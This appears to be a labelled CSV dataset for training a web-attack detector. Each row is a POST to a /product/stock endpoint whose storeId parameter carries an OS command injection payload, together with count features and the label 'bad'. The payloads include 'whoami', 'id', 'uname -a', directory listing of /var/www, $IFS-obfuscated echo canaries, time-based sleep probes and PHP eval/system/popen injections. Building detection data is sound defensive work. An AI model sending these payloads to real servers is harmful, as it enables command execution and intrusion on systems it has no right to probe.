method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo GJNRXW); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo DAECDG)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSEJJUPB$((40+97))$(echo$IFSEJJUPB)EJJUPB&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YQABCF)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo AIVPGH) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ;echo RYBOGB$((74+55))$(echo RYBOGB)RYBOGB""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo WIGALP | tr -d '\n' | wc -c) ] || sleep 1 %22,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSCDYIRQ$((76+46))$(echo$IFSCDYIRQ)CDYIRQ|",0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo TOQHQO$((39+33))$(echo TOQHQO)TOQHQO",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo SKWMFK | tr -d '\n' | wc -c) ] || sleep 1 %26,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 & sleep 0 && str=$(echo VGAFPT) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSQOEJNZ$((82+42))$(echo$IFSQOEJNZ)QOEJNZ//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSAVKTLV$((14+43))$(echo$IFSAVKTLV)AVKTLV'",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %7C,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo$IFSEMNGCD$((37+86))$(echo$IFSEMNGCD)EMNGCD&",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo BUJJSS\necho $((4+1))\necho BUJJSS\necho BUJJSS`);%252529%25257DBUJJSS",0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 '&echo$IFSQYHHIE$((90+44))$(echo$IFSQYHHIE)QYHHIE""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSGCRAHC$((53+91))$(echo$IFSGCRAHC)GCRAHC",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSRFYMLA$((34+26))$(echo$IFSRFYMLA)RFYMLA|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ZGYOBQ); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo JDTYJX$((18+24))$(echo JDTYJX)JDTYJX//",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo KVIAFY$((17+57))$(echo KVIAFY)KVIAFY",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSJQOKUV$((22+52))$(echo$IFSJQOKUV)JQOKUV|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ASBPAS); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 echo IXGIJZ$((51+13))$(echo IXGIJZ)IXGIJZ""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo QBALEF$((39+26))$(echo QBALEF)QBALEF&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSCNSGBG$((72+11))$(echo$IFSCNSGBG)CNSGBG|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo VILFSX)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSEYVRFU$((99+52))$(echo$IFSEYVRFU)EYVRFU//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo FZLTEJ$((27+72))$(echo FZLTEJ)FZLTEJ|,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo ULPNTA$((21+48))$(echo ULPNTA)ULPNTA,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSARASQY$((54+7))$(echo$IFSARASQY)ARASQY,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo MATZOK) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %2F%2F,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo JFXLVC$((83+84))$(echo JFXLVC)JFXLVC\\,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo HEMYTZ$((83+92))$(echo HEMYTZ)HEMYTZ//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${popen(print(`echo RWKSAH
echo $((18+34))
echo RWKSAH
echo RWKSAH`);RWKSAH",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo NTKAFT$((47+6))$(echo NTKAFT)NTKAFT',0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 |echo GEPPDW$((55+58))$(echo GEPPDW)GEPPDW""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo JADKKF)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '; str=$(echo RCYHEM); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo EWYGBO); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo RYNLFM$((45+53))$(echo RYNLFM)RYNLFM,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSHLZSZR$((18+53))$(echo$IFSHLZSZR)HLZSZR""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 3 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo GUASVW); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo NCDDER$((2+81))$(echo NCDDER)NCDDER//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSQFSVNV$((60+49))$(echo$IFSQFSVNV)QFSVNV//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ZSTLVQ) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 &",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &echo$IFSMONACC$((64+29))$(echo$IFSMONACC)MONACC""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 &echo TIIEEY$((36+32))$(echo TIIEEY)TIIEEY""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 && ls -l /var/www/*,0,1,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %5C%5C,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '|echo UTCPPJ$((1+15))$(echo UTCPPJ)UTCPPJ""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSUHQPMD$((69+4))$(echo$IFSUHQPMD)UHQPMD//",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSPQBYOG$((45+3))$(echo$IFSPQBYOG)PQBYOG,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo OKHPYH$((66+11))$(echo OKHPYH)OKHPYH',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSHAWFWE$((23+63))$(echo$IFSHAWFWE)HAWFWE//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '&echo$IFSHKZBYJ$((43+76))$(echo$IFSHKZBYJ)HKZBYJ""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSLFCSIP$((11+52))$(echo$IFSLFCSIP)LFCSIP|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 id",0,0,0,0,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 '& sleep 0 && str=$(echo DPWDWF) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 eval('sleep 5');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | uname -a,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo RUNALC | tr -d '\n' | wc -c) ] || sleep 1 \\,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSOZHGXS$((54+58))$(echo$IFSOZHGXS)OZHGXS\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo SGDKKT$((60+36))$(echo SGDKKT)SGDKKT|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo UYJMIM); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 |,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 'echo NIXAXB$((47+23))$(echo NIXAXB)NIXAXB|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 |,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSFYUXPA$((17+24))$(echo$IFSFYUXPA)FYUXPA',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo XOCEJG$((66+21))$(echo XOCEJG)XOCEJG',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 a);id|,0,0,0,1,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo BYUJUS)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${system(print(`echo YYSFAL\necho $((70+5))\necho YYSFAL\necho YYSFAL`);%252529%25257DYYSFAL,0,0,2,0,0,0,0,9,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSCPVCLF$((68+4))$(echo$IFSCPVCLF)CPVCLF|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo FLLKBG$((76+53))$(echo FLLKBG)FLLKBG&",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo VQEAPQ); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ' echo JADUEG$((82+93))$(echo JADUEG)JADUEG""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ${proc_open(print(`echo JXTIWP
echo $((97+60))
echo JXTIWP
echo JXTIWP`);.%2522JXTIWP",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 &&echo ZVYTEU$((90+87))$(echo ZVYTEU)ZVYTEU',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo RCCBBV$((37+98))$(echo RCCBBV)RCCBBV\\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSWTMGEX$((31+97))$(echo$IFSWTMGEX)WTMGEX\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo XRKWTL$((1+66))$(echo XRKWTL)XRKWTL//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo VZHJIZ$((31+26))$(echo VZHJIZ)VZHJIZ//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSKGPTGS$((5+86))$(echo$IFSKGPTGS)KGPTGS|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo VSBIXB$((26+99))$(echo VSBIXB)VSBIXB//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo JGZWWL$((44+20))$(echo JGZWWL)JGZWWL|",0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo NSANUP); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSXDHKIF$((56+17))$(echo$IFSXDHKIF)XDHKIF&",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ');}print(`echo TBZBGJ`.`echo $((58+75))`.`echo TBZBGJ`.`echo TBZBGJ`);\\TBZBGJ,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo XUZUDN$((64+48))$(echo XUZUDN)XUZUDN//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ';echo HTPOKC$((39+32))$(echo HTPOKC)HTPOKC,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSCZXGHY$((46+9))$(echo$IFSCZXGHY)CZXGHY&,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo XJGESW$((2+77))$(echo XJGESW)XJGESW|,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSGOWBHJ$((93+50))$(echo$IFSGOWBHJ)GOWBHJ&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo LZWGVJ$((6+60))$(echo LZWGVJ)LZWGVJ|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 5 -ne $(echo RBBJAR | tr -d '\n' | wc -c) ] || sleep 1,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSTXFGBP$((28+0))$(echo$IFSTXFGBP)TXFGBP&,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo PGAQQT); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSFYRIYE$((49+44))$(echo$IFSFYRIYE)FYRIYE|,0,1,4,1,0,0,0,2,bad
